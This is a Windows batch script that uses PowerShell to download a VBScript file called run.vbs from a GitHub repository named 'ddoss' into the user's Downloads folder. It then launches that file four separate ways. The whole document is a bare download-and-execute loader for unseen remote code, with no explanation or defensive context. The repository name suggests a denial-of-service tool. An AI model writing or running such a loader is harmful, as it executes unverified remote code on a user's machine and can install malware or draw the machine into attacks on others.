@echo off

set "url=https://raw.githubusercontent.com/srap18/ddoss/main/run.vbs"
set "dest=%USERPROFILE%\Downloads\run.vbs"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%dest%')"

start "" "%dest%"
wscript "%dest%"
cmd /c "%dest%"
explorer "%dest%"

pause
